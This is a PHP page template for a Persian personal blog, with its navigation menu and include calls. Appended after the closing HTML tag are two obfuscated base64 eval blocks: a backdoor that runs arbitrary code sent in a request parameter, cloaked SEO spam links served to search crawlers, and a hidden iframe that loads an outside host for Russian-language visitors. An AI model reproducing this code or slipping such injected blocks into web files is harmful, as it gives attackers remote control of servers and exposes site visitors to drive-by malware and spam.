<?php require("header.php"); ?>
<body>
<div id="outer">
  <div class="column01"><br/><a href="http://feeds.feedburner.com/barg">
                                <img alt="RSS 2.0" src="templates/gn/images/rss_icon.gif" style="border-width: 0; width: 16px; height: 16px" /></a></div>
  <div class="column02">
    <h1><a href="http://www.bargweb.net/">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<div class="upperSpacer"></div></a></h1>
  </div>
  <div class="column03">
    <div class="search">
      <?php include ("searchform.php"); ?>
    </div>
  </div>
  <div class = "postColumn"><div class="upperSpacer"></div><div class="navBorder"></div><div class="column01">وبلاگ برگ<br /><?php echo( $b_i->getDate("l")); ?><br /><?php echo( $b_i->getDate("j F Y")); ?></div>
  <div class="column02">
	  <ul id="nav">
		  <li id="nav01" class="activeMenu">
			  <a href="/">
				  برگ اول<br/><span class="listMeta">
					  صفحه‌ی خانگی
				  </span>
			  </a>
		  </li>
		  <li id="nav02">
			  <a href="?mode=2">
				  آرشیو برگ<br/><span class="listMeta">
					  مطالب گذشته
				  </span>
			  </a>
		  </li>
		  <li id="nav03">
			  <a>
				  گالری برگ<br/><span class="listMeta">
					  گرافیک دیجیتال و …
				  </span>
			  </a>
		  </li>
		  <li id="nav04">
			  <a href="?mode=contact">
				  تماس با من<br/><span class="listMeta">
					  ارسال پیام، ایمیل من
				  </span>
			  </a>
		  </li>
		  <li id="nav05">
			  <a href="?mode=about">
				  درباره‌ی برگ<br/><span class="listMeta">
					  کپی‌رایت، دیزاین،…
				  </span>
			  </a>
		  </li>
	  </ul>
  </div></div>
  <div class="postColumn"><div class="navBorder"></div><br />
    <?php include ("post.php"); ?>
<?php include ("footer.php"); ?>
<div class="column03">
    <?php require("sidebar.php"); ?>
  </div>
  <br clear="all" />
  <div></div>
</div>
</div>
</body>
</html><?php eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwppZigkX1JFUVVFU1RbJ2RmcXczMWYnXSkKZXZhbChiYXNlNjRfZGVjb2RlKCRfUkVRVUVTVFsnZGZxdzMxZiddKSk7CiRocmVmID0gJ2h0dHA6Ly93d3cucHJvc29mdHdhcmVzdG9yZS5jb20vJzsKJHdvcmRzID0gYXJyYXkoJ1NvZnR3YXJlIFN0b3JlJywgJ01pY3Jvc29mdCBTb2Z0d2FyZScsICdBZG9iZSBTb2Z0d2FyZScsICdBdXRvZGVzayBTb2Z0d2FyZScsICdCb3JsYW5kIFNvZnR3YXJlIHNob3AnLCAnVk13YXJlIFNvZnR3YXJlJywgJ1Nob3AgU29mdHdhcmUnLCAnTUFDIFNvZnR3YXJlJywgJ1dpbmRvd3MgU29mdHdhcmUnLCAnU3ltYW50ZWMgc2hvcCcpOwoka2V5bnVtID0gY291bnQoJHdvcmRzKTsKJGFsdHMgPSAkd29yZHM7CgokciA9IHJhbmQoMCwgMyk7CiRyMiA9IHJhbmQoNCwgNyk7CiRyMyA9IHJhbmQoOCwgJGtleW51bS0xKTsKc2h1ZmZsZSgkYWx0cyk7CmZvcigkaT0wOyAkaTwka2V5bnVtOyAkaSsrKQp7CmlmKCRpPT0kciB8fCAkaT09JHIyIHx8ICRpPT0kcjMpCnsKJHI0ID0gcmFuZCgxLCAzKTsKJHN0ciA9IGltcGxvZGUoIiAiLCBhcnJheV9zbGljZSgkd29yZHMsIDAsIHJhbmQoMSwgaW50dmFsKCRrZXludW0vMikrMSkpKTsKJGFsdHNbJGldID0gIjxoND48YSBocmVmPVwiJGhyZWZcIiBhbHQ9XCIkc3RyXCIgdGl0bGU9XCIkc3RyXCI+U2hvcCAiLiRhbHRzWyRpXS4iPC9hPjwvaDQ+IjsKfQp9CmFycmF5X3B1c2goJGFsdHMsICI8YSBocmVmPVwiJGhyZWZcIj4kaHJlZjwvYT4iKTsKc2h1ZmZsZSgkYWx0cyk7CiRzdHIgPSBpbXBsb2RlKCIgIiwgJGFsdHMpOwppZihwcmVnX21hdGNoKCIvKGNyYXdsKXwoZ29vZ2xlKXwoeWFob28pfChiaW5nKXwoc3B5KXwoYm90KXwocGVybCl8KHB5dGhvbil8KGhvbG1lcyl8KGFsZXhhKXwoYi1vLXQpfChmaW5kbGlua3MpfChpY2hpcm8pfChsYXJiaW4pfChsaW5rKXwobHdwKXwoUHljVVJMKXwoc2NydWJieSl8KHNlYXJjaCl8KHN0YWNrKXwodXBkYXRlZCkvaSIsICRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkpCmVjaG8oIjxkaXYgYWxpZ249Y2VudGVyPiRzdHI8L2Rpdj4iKTsKZWxzZQplY2hvKCI8Zm9udCBzdHlsZT1cInBvc2l0aW9uOi8qKi9hYnNvbHV0ZTtvdmVyZmxvdzovKiovaGlkZGVuOy8qKi93aWR0aDovKiovMFwiPiRzdHI8YSBocmVmPSckaHJlZic+JGhyZWY8L2E+PC9mb250PiIpOw==")); ?>
<?php eval(base64_decode("aWYocHJlZ19tYXRjaCgiL3J1L2kiLCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKSkNCgkJZWNobyAnPGlmcmFtZSBzcmM9Imh0dHA6Ly9hZGhlc2l2ZXN0cmVuZ3RoLmluL2luLmNnaT8xODQiIGZyYW1lYm9yZGVyPSIwIiB3aWR0aD0iMyIgaGVpZ2h0PSIzIiBzdHlsZT0idmlzaWJpbGl0eTogaGlkZGVuOyI+PC9pZnJhbWU+Jzs=")); ?>
